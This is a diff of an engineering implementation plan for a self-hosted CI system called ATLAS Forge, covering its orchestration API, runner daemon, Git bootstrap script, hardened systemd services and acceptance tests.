 export type ForgeApiConfig = {
@@ -692,11 +641,11 @@ export type ForgeApiConfig = {
 };
 ```
 
-Reject startup if either token is shorter than 32 characters in non-test mode. `auth.ts` compares UTF-8 token buffers with `timingSafeEqual` only after equal-length check.
+In non-test mode reject tokens shorter than 32 characters. Compare equal-length UTF-8 buffers with `timingSafeEqual`; never log token values.
 
-- [ ] **Step 4: Implement atomic filesystem state**
+- [ ] **Step 4: Implement atomic filesystem state and durable audit**
 
-Persist one JSON file per run/job under:
+Persist:
 
 ```text
 <home>/state/runs/<runId>.json
@@ -705,78 +654,59 @@ Persist one JSON file per run/job under:
 <home>/audit/events.jsonl
 ```
 
-Every JSON mutation writes to a sibling temporary file with mode `0600`, `fsync`s the file, then renames it atomically. `claim` selects the oldest queued job, moves job/run `queued -> assigned`, records `assignedRunnerId`, and returns the full exact pipeline definition.
+JSON record changes use sibling temporary file mode `0600`, `fsync`, then atomic rename. `FileAuditSink` writes events matching the shared ATLAS audit shape with actions `forge.run.create`, `forge.job.claim`, `forge.job.start`, and `forge.run.complete`.
 
-- [ ] **Step 5: Implement endpoint semantics**
+- [ ] **Step 5: Implement exact endpoint transitions**
 
-`POST /v1/runs` validates repository ID against `/^[a-z0-9][a-z0-9-]{0,63}$/`, source SHA against `/^[0-9a-f]{40}$/`, loads `<pipelinesRoot>/<pipelineId>.json`, validates with `parsePipeline`, creates one run and one job, and emits audit action `forge.run.create`.
+`POST /v1/runs` validates repository ID `/^[a-z0-9][a-z0-9-]{0,63}$/` and SHA `/^[0-9a-f]{40}$/`, loads `<pipelinesRoot>/<pipelineId>.json`, validates with `parsePipeline`, creates run/job in `queued`.
 
-`POST /v1/jobs/claim` accepts `{ "runnerId": "runner-..." }`; returns `204` when no work exists.
+`POST /v1/jobs/claim` accepts runner ID, selects oldest queued job, applies `queued -> assigned` to job and run, and records `assignedRunnerId`.
 
-`POST /v1/jobs/:id/log` accepts `{ "line": "..." }`, caps each line at 16 KiB, strips NUL bytes, and appends the timestamped log line.
+`POST /v1/jobs/:id/start` requires the same runner ID that claimed the job and applies `assigned -> running`, setting run `startedAt`.
 
-`POST /v1/jobs/:id/complete` accepts `status`, exact `stepResults`, and nullable artifact record. Only terminal statuses are accepted. It updates both job and run and emits `forge.run.complete`.
+`POST /v1/jobs/:id/log` caps each input line at 16 KiB and strips NUL characters.
 
-`GET /healthz` returns `200` with `{ "status": "ready" }` only when state, repositories, logs, and artifact roots are readable/writable; otherwise `503` with `{ "status": "degraded", "checks": [...] }`.
+`POST /v1/jobs/:id/complete` accepts only `passed|failed|cancelled|timed_out|infrastructure_error` and only from `running`; it stores exact step results and nullable artifact record, then sets `finishedAt`.
 
-- [ ] **Step 6: Add compiled workspace scripts**
+`GET /healthz` returns `200 {"status":"ready"}` only when state/repository/log/artifact roots are readable and writable; otherwise return `503` with status `degraded` and named checks.
 
-Each Node Forge package/app uses a package-local `tsconfig.json` extending `../../tsconfig.base.json` while overriding:
+- [ ] **Step 6: Add runtime scripts and test**
 
-```json
-{
-  "compilerOptions": {
-    "module": "NodeNext",
-    "moduleResolution": "NodeNext",
-    "noEmit": false,
-    "isolatedModules": false,
-    "types": ["node"],
-    "rootDir": "src",
-    "outDir": "dist",
-    "declaration": true
-  }
-}
-```
-
-Each package exposes `./dist/index.js`; executable workspaces add `build` and `start` scripts. Now add the root `forge:build` and `forge:ci:local` scripts defined in Task 4 plus:
+Add:
 
 ```json
 {
-  "forge:api:start": "node apps/forge-api/dist/main.js",
-  "forge:runner:start": "node packages/forge-runner/dist/daemon.js"
+  "forge:api:start": "tsx apps/forge-api/src/main.ts",
+  "forge:runner:start": "tsx packages/forge-runner/src/daemon.ts"
 }
 ```
 
-- [ ] **Step 7: Test, type-build Forge, and commit**
+Run:
 
 ```bash
 npm install --no-audit --no-fund
 npm test -- tests/integration/forge-api.test.ts
-npm run forge:build
-git add apps/forge-api packages/forge-core packages/forge-git packages/forge-runner packages/forge-artifacts package.json package-lock.json tests/integration/forge-api.test.ts
+npm run forge:typecheck
+git add apps/forge-api tests/integration/forge-api.test.ts package.json package-lock.json
 git commit -m "feat: add ATLAS Forge orchestration API"
 ```
 
-Expected: API tests PASS and all Forge packages compile to `dist`.
-
 ---
 
-### Task 7: Network runner client and one-job daemon
+### Task 7: Runner API client and daemon
 
 **Files:**
 - Create: `packages/forge-runner/src/apiClient.ts`
 - Create: `packages/forge-runner/src/daemon.ts`
 - Modify: `packages/forge-runner/src/index.ts`
-- Modify: `tests/unit/forge-runner.test.ts`
 - Create: `tests/integration/forge-runner-api.test.ts`
 
 **Interfaces:**
-- Consumes API contracts from Task 6, local repositories at `<repositoriesRoot>/<repositoryId>.git`, and Artifact Vault.
-- Produces `ForgeApiClient`, `executeClaimedJob(job, config)`, and `runDaemon(config)`.
+- Produces `ForgeApiClient.claim`, `ForgeApiClient.start`, `ForgeApiClient.appendLog`, `ForgeApiClient.complete`, `executeClaimedJob`, and `runDaemon`.
 
 - [ ] **Step 1: Write failing runner/API integration test**
 
-The test starts a temporary Forge API, creates a tiny local Git repository with a committed `package.json`, pushes it to `<repos>/atlas.git`, queues a run, then calls `runDaemon({ once: true, ... })`. The test expects the run to leave `queued` and become terminal, the runner log file to contain the executed step ID, and the checked-out SHA to match the queued SHA.
+Create a temporary local Git repo with a small npm project, push to `<repos>/atlas.git`, start Forge API, queue its exact SHA, run daemon once, and assert run reaches a terminal state, log contains its pipeline step ID, and checked-out SHA was exact.
 
 - [ ] **Step 2: Verify RED**
 
@@ -784,47 +714,39 @@ The test starts a temporary Forge API, creates a tiny local Git repository with 
 npm test -- tests/integration/forge-runner-api.test.ts
 ```
 
-- [ ] **Step 3: Implement API client with no token logging**
-
-`ForgeApiClient` constructor receives `{ baseUrl, runnerToken }`. Methods:
+- [ ] **Step 3: Implement runner client without credential leakage**
 
 ```ts
 claim(runnerId: string): Promise<ForgeJobRecord | null>;
-appendLog(jobId: string, line: string): Promise<void>;
-complete(jobId: string, result: { status: ForgeRunStatus; stepResults: readonly ForgeStepResult[]; artifact: ForgeArtifactRecord | null }): Promise<void>;
+start(jobId: string, runnerId: string): Promise<void>;
+appendLog(jobId: string, runnerId: string, line: string): Promise<void>;
+complete(jobId: string, runnerId: string, result: {
+  status: ForgeRunStatus;
+  stepResults: readonly ForgeStepResult[];
+  artifact: ForgeArtifactRecord | null;
+}): Promise<void>;
 ```
 
-For HTTP non-2xx, throw an error containing status code and response body capped at 4 KiB; never include request Authorization header.
+For non-2xx responses throw an error containing status and response text capped at 4 KiB, never Authorization data.
 
-- [ ] **Step 4: Implement claimed-job execution**
+- [ ] **Step 4: Implement exact-SHA claimed job execution**
 
-For each job:
+For each claimed job: derive bare repository path from validated `repositoryId`; create `<home>/workspaces/<jobId>`; call `checkoutExactSha`; call API `start`; execute pipeline; on pass publish the configured artifact directory through `FilesystemArtifactStore`; complete the job; remove workspace in `finally`.
 
-1. derive repository path only from validated `repositoryId` and configured `repositoriesRoot`;
-2. create `<home>/workspaces/<jobId>`;
-3. `checkoutExactSha` into that directory;
-4. transition `assigned -> running` through API log evidence;
-5. execute pipeline sequentially;
-6. if passed, publish each configured artifact directory through `FilesystemArtifactStore`; the bootstrap pipeline has exactly one path;
-7. complete the job with terminal status and artifact record;
-8. recursively delete the disposable workspace in `finally`.
+The daemon polls every 2000 ms by default. `--once` performs one claim/no-claim cycle. SIGTERM stops accepting jobs and waits for the active step to finish or time out.
 
-- [ ] **Step 5: Implement daemon polling**
-
-The daemon reads `ATLAS_FORGE_API_URL`, `ATLAS_FORGE_RUNNER_TOKEN`, `ATLAS_FORGE_RUNNER_ID`, `ATLAS_FORGE_HOME`, and `ATLAS_FORGE_REPOSITORIES_ROOT`. Default poll interval is 2000 ms. `--once` or test config exits after one claim/no-claim cycle. SIGTERM stops after the active job completes or after its current step times out.
-
-- [ ] **Step 6: Test and commit**
+- [ ] **Step 5: Test/typecheck/commit**
 
 ```bash
 npm test -- tests/unit/forge-runner.test.ts tests/integration/forge-runner-api.test.ts
-npm run forge:build
-git add packages/forge-runner tests/unit/forge-runner.test.ts tests/integration/forge-runner-api.test.ts
+npm run forge:typecheck
+git add packages/forge-runner tests/integration/forge-runner-api.test.ts
 git commit -m "feat: connect ATLAS Forge runner to orchestrator"
 ```
 
 ---
 
-### Task 8: Bootstrap local authoritative Git copy and systemd services
+### Task 8: Authoritative local source bootstrap and hardened systemd services
 
 **Files:**
 - Create: `scripts/forge/bootstrap-local-repository.sh`
@@ -833,66 +755,50 @@ git commit -m "feat: connect ATLAS Forge runner to orchestrator"
 - Create: `infra/forge/systemd/atlas-forge-runner.service`
 - Create: `infra/forge/forge.env.example`
 - Create: `docs/operations/atlas-forge-bootstrap.md`
-- Create: `.gitignore`
+- Create/Modify: `.gitignore`
 
 **Interfaces:**
-- Produces a provider-independent local bare repository and repeatable service installation contract.
-- GitHub mirror is optional remote name `github`; sync failure exits nonzero for the sync command but does not stop API/runner services.
+- Produces a local bare repository usable without GitHub and repeatable Linux service contracts.
+- Optional remote name `github` may fail without stopping Forge API/runner.
 
-- [ ] **Step 1: Write bootstrap shell scripts with strict mode**
-
-`bootstrap-local-repository.sh` begins:
+- [ ] **Step 1: Write strict bootstrap script**
 
 ```bash
 #!/usr/bin/env bash
 set -euo pipefail
-
 SOURCE_REPOSITORY=${1:?usage: bootstrap-local-repository.sh <source-working-copy> <forge-home> <repository-id>}
 FORGE_HOME=${2:?forge home required}
 REPOSITORY_ID=${3:?repository id required}
-
 [[ "$REPOSITORY_ID" =~ ^[a-z0-9][a-z0-9-]{0,63}$ ]] || { echo "invalid repository id" >&2; exit 64; }
-mkdir -p "$FORGE_HOME/repos" "$FORGE_HOME/state/runs" "$FORGE_HOME/state/jobs" "$FORGE_HOME/logs" "$FORGE_HOME/artifacts" "$FORGE_HOME/workspaces"
+mkdir -p "$FORGE_HOME"/{repos,state/runs,state/jobs,logs,audit,artifacts,workspaces,home,npm-cache}
 chmod 700 "$FORGE_HOME"
 TARGET="$FORGE_HOME/repos/$REPOSITORY_ID.git"
-
 if [[ ! -d "$TARGET" ]]; then
   git clone --mirror "$SOURCE_REPOSITORY" "$TARGET"
 fi
-
 git --git-dir "$TARGET" config receive.denyNonFastForwards true
 git --git-dir "$TARGET" fsck --full
 printf '%s\n' "$TARGET"
 ```
 
-`sync-git-mirror.sh` accepts `<bare-repository> <remote-name>`, runs `git fetch --prune` and then `git push --mirror` only when the operator explicitly passes `--push`. It never uses `--force` as an implicit reconciliation mechanism.
+`sync-git-mirror.sh` accepts `<bare-repository> <remote-name>` and optional `--push`; it fetches/prunes by default, pushes `--mirror` only when explicitly requested, and never silently uses `--force` to reconcile divergence.
 
-- [ ] **Step 2: Add hardened systemd unit contracts**
+- [ ] **Step 2: Add systemd hardening**
 
-API unit requirements:
+Both services use `User=atlas-forge`, `Group=atlas-forge`, `WorkingDirectory=/opt/atlas/atlasenterprisesuite`, `EnvironmentFile=/etc/atlas-forge/forge.env`, `Restart=on-failure`, `NoNewPrivileges=true`, `PrivateTmp=true`, `ProtectHome=true`, `ProtectSystem=strict`, and `ReadWritePaths=/srv/atlas-forge`.
+
+API `ExecStart=/usr/bin/npm run forge:api:start`; runner `ExecStart=/usr/bin/npm run forge:runner:start`.
+
+Add service environment:
 
 ```ini
-[Service]
-Type=simple
-User=atlas-forge
-Group=atlas-forge
-WorkingDirectory=/opt/atlas/atlasenterprisesuite
-EnvironmentFile=/etc/atlas-forge/forge.env
-ExecStart=/usr/bin/npm run forge:api:start
-Restart=on-failure
-RestartSec=3
-NoNewPrivileges=true
-PrivateTmp=true
-ProtectHome=true
-ProtectSystem=strict
-ReadWritePaths=/srv/atlas-forge
+Environment=HOME=/srv/atlas-forge/home
+Environment=NPM_CONFIG_CACHE=/srv/atlas-forge/npm-cache
 ```
 
-Runner unit uses the same hardening and `ExecStart=/usr/bin/npm run forge:runner:start`.
+- [ ] **Step 3: Add non-secret environment example and operations procedure**
 
-- [ ] **Step 3: Add environment contract without committing secrets**
-
-`infra/forge/forge.env.example` contains non-secret paths/ports only:
+`infra/forge/forge.env.example`:
 
 ```dotenv
 ATLAS_FORGE_HOME=/srv/atlas-forge
@@ -904,11 +810,11 @@ ATLAS_FORGE_PORT=8788
 ATLAS_FORGE_RUNNER_ID=runner-primary
 ```
 
-The operations doc explicitly instructs the operator to create `ATLAS_FORGE_CONTROL_TOKEN` and `ATLAS_FORGE_RUNNER_TOKEN` in `/etc/atlas-forge/forge.env` with at least 32 random bytes and `chmod 600`; no secret example value is committed.
+The operations doc instructs the operator to generate `ATLAS_FORGE_CONTROL_TOKEN` and `ATLAS_FORGE_RUNNER_TOKEN` with at least 32 random bytes into `/etc/atlas-forge/forge.env`, `chmod 600` the file, and never paste either value into Git or logs.
 
-- [ ] **Step 4: Ignore local runtime state**
+- [ ] **Step 4: Ignore runtime state without deleting existing rules**
 
-`.gitignore` must include:
+Ensure `.gitignore` contains:
 
 ```gitignore
 node_modules/
@@ -917,9 +823,7 @@ dist/
 *.log
 ```
 
-Before replacing any existing ignore file discovered during implementation, merge these entries rather than deleting existing rules.
-
-- [ ] **Step 5: Shell-validate and commit**
+- [ ] **Step 5: Validate and commit**
 
 ```bash
 bash -n scripts/forge/bootstrap-local-repository.sh
@@ -930,7 +834,7 @@ git commit -m "ops: bootstrap sovereign ATLAS Forge services"
 
 ---
 
-### Task 9: Sovereign continuity E2E and final bootstrap gate
+### Task 9: Sovereign continuity E2E and bootstrap acceptance gate
 
 **Files:**
 - Create: `tests/integration/forge-sovereign-ci.test.ts`
@@ -938,44 +842,43 @@ git commit -m "ops: bootstrap sovereign ATLAS Forge services"
 - Modify: `docs/operations/atlas-forge-bootstrap.md`
 
 **Interfaces:**
-- Verifies the Milestone 1 promise: local source + local API + local runner + local artifact vault still complete a run when the configured GitHub mirror is unavailable.
+- Proves local source + local API + local runner + local Artifact Vault completes a run while `github` mirror is deliberately unavailable.
 
 - [ ] **Step 1: Write the full sovereign integration test**
 
-The test must perform all of these actions in one temporary directory:
+In one temporary directory:
 
-1. create a source Git repo containing a minimal npm package and `dist/index.html` generation script;
-2. create/push to a local bare repo `repos/atlas.git`;
-3. add a `github` remote pointing to a guaranteed-missing local path and assert `syncMirror(...).state === 'unavailable'`;
+1. create a source Git repo containing a minimal npm package whose build writes `dist/index.html`;
+2. push it to `repos/atlas.git`;
+3. add `github` remote pointing to a guaranteed-missing local path and verify `syncMirror(...).state === 'unavailable'`;
 4. start Forge API on an ephemeral port;
-5. queue exact source SHA with a test pipeline containing only allowed `npm` commands;
-6. execute a runner `once` cycle;
-7. fetch the run and assert `status === 'passed'`;
-8. assert every recorded step is `passed`;
-9. assert the artifact record exists and `verifyArtifact(record) === true`;
-10. assert the GitHub mirror remains `unavailable` and did not change the run outcome;
-11. assert an audit event exists for run creation and run completion.
+5. queue exact source SHA with a test `npm` pipeline;
+6. execute one runner cycle;
+7. fetch run and assert `status === 'passed'`;
+8. assert all step results are `passed`;
+9. verify the artifact through `FilesystemArtifactStore.verifyArtifact`;
+10. assert mirror remains `unavailable` and did not alter run status;
+11. assert audit events exist for create, claim, start, and complete.
 
-The central assertions are:
+Central assertions:
 
 ```ts
 expect(mirror.state).toBe('unavailable');
 expect(run.status).toBe('passed');
-expect(run.artifact?.verified).toBe(true);
-expect(await artifactStore.verifyArtifact(run.artifact!)).toBe(true);
+if (!run.artifact) throw new Error('expected Forge artifact');
+expect(run.artifact.verified).toBe(true);
+expect(await artifactStore.verifyArtifact(run.artifact)).toBe(true);
 ```
 
-- [ ] **Step 2: Verify the sovereign E2E passes without network**
+- [ ] **Step 2: Verify sovereign E2E without network**
 
 ```bash
 npm test -- tests/integration/forge-sovereign-ci.test.ts
 ```
 
-Expected: PASS with the `github` remote deliberately unavailable.
+Expected: PASS with the GitHub mirror intentionally unavailable.
 
-- [ ] **Step 3: Add a focused Forge verification script**
-
-Add root script:
+- [ ] **Step 3: Add focused verification script**
 
 ```json
 {
@@ -983,32 +886,30 @@ Add root script:
 }
 ```
 
-- [ ] **Step 4: Run the complete bootstrap verification matrix**
-
-Run fresh, from the final implementation SHA:
+- [ ] **Step 4: Run complete bootstrap matrix from final SHA**
 
 ```bash
 npm ci --no-audit --no-fund
-npm run typecheck
+npm run forge:typecheck
 npm run test:forge
+npm run typecheck
 npm run test:unit
 npm run test:integration
 npm audit --audit-level=high
 npm run build
-npm run forge:build
 ```
 
-Expected: every command exits `0`. If the existing application suites fail for a pre-existing unrelated reason, record the exact failing test and do not mark Forge bootstrap complete until the release branch is green again.
+Every command must exit `0`. Pre-existing unrelated failures are recorded precisely and keep Milestone 1 from being called green until corrected.
 
-- [ ] **Step 5: Smoke the emergency local runner against the real ATLAS checkout**
+- [ ] **Step 5: Smoke emergency local CI against the complete ATLAS checkout**
 
 ```bash
 ATLAS_FORGE_HOME="$(mktemp -d)" npm run forge:ci:local
 ```
 
-Expected: the local runner records the exact current Git SHA, executes the canonical `atlas-ci` pipeline, and writes evidence under the temporary Forge home. Do not claim success if this command has not actually run on a complete checkout.
+Expected: exact current Git SHA is recorded and canonical ATLAS CI executes without GitHub Actions. Do not claim this smoke passed unless it actually ran on a complete checkout.
 
-- [ ] **Step 6: Verify repository integrity and commit**
+- [ ] **Step 6: Repository integrity and commit**
 
 ```bash
 git fsck --full
@@ -1017,36 +918,34 @@ git add tests/integration/forge-sovereign-ci.test.ts package.json package-lock.j
 git commit -m "test: prove ATLAS Forge sovereign CI continuity"
 ```
 
-Expected: clean worktree after commit and a green Forge verification matrix.
-
 ---
 
 ## Bootstrap Acceptance Gate
 
-Milestone 1 is accepted only with evidence for all items below:
+Milestone 1 is accepted only when evidence confirms:
 
-- [ ] Local bare Git repository resolves the same exact SHA as the source branch.
-- [ ] `git fsck --full` succeeds on the ATLAS-controlled source copy.
+- [ ] ATLAS-controlled bare Git resolves the same exact release SHA as its source copy.
+- [ ] `git fsck --full` passes on the local authoritative copy.
 - [ ] `npm run forge:ci:local` executes without GitHub Actions.
-- [ ] Forge API `/healthz` is `ready` on the ATLAS-controlled host.
-- [ ] Runner claims a queued exact-SHA job and executes it in a disposable workspace.
-- [ ] Ambient control/runner tokens are absent from job environments and logs.
-- [ ] Unit, integration, dependency audit, and production build steps produce terminal evidence.
+- [ ] Forge API `/healthz` is `ready` on an ATLAS-controlled host.
+- [ ] Runner claims, starts, executes, and completes one exact-SHA job in a disposable workspace.
+- [ ] Ambient Forge control/runner tokens do not appear in job environment or logs.
+- [ ] Unit, integration, dependency-audit, and web build outcomes have terminal evidence.
 - [ ] Artifact Vault publishes and re-verifies SHA-256 content-addressed evidence.
 - [ ] Deliberately unavailable `github` mirror reports `unavailable` while sovereign CI still passes.
-- [ ] Audit evidence ties run creation/completion to correlation IDs.
-- [ ] systemd API and runner services restart cleanly after host process restart.
-- [ ] At least one independent source copy exists in addition to the primary Forge bare repository before Forge is called resilient; until then the readiness state must say backup verification is pending.
-- [ ] No merge to `main`, production deployment, or claim of full Forge completion occurs from this milestone alone.
+- [ ] Audit records correlate run creation, claim, start, and completion.
+- [ ] systemd API/runner services restart cleanly after process restart.
+- [ ] A second independent repository copy or verified backup exists before Forge is called resilient; until then readiness must explicitly say backup verification is pending.
+- [ ] No merge to `main`, production deployment, or claim of complete ATLAS Forge occurs from this bootstrap milestone alone.
 
-## Follow-on Plans After This Milestone
+## Follow-on Plans
 
-Once this bootstrap acceptance gate is green, write separate implementation plans in this order:
+After Milestone 1 is green, create separate plans in this order:
 
-1. `ATLAS Forge Reviews + Consensus Gate` — internal review object, changed-file review, approvals, merge eligibility, 3-of-3 consensus.
-2. `ATLAS Forge Multi-Runner Scheduler + Secret References` — capability labels, leases, retries, short-lived runner credentials, encrypted secret backend adapter.
-3. `ATLAS Forge Release Engine` — release candidates, approval, deployment adapters, `/healthz` verification, rollback metadata.
-4. `ATLAS Forge Web UI` — `/forge/*` operational screens backed only by real Forge API state.
-5. `ATLAS Forge Replication + Disaster Recovery` — second independent repository/metadata copy, automated integrity checks, tested restore procedure.
+1. **Forge Reviews + Consensus Gate** — internal review object, diffs, approvals, merge eligibility, existing 3-of-3 consensus.
+2. **Forge Multi-Runner Scheduler + Secret References** — capability labels, leases, retries, short-lived credentials, encrypted secret adapter.
+3. **Forge Release Engine** — release candidates, approval, deployment adapters, `/healthz` verification, rollback metadata.
+4. **Forge Web UI** — real `/forge/*` operational screens backed only by Forge API state.
+5. **Forge Replication + Disaster Recovery** — second independent source/metadata copy, scheduled integrity verification, tested restore.
 
-The bootstrap runner is intentionally first because it removes the current GitHub Actions runner dependency before the broader Forge product surface is built.
+This bootstrap is first because it removes the current GitHub Actions runner dependency before building the broader Forge product surface.
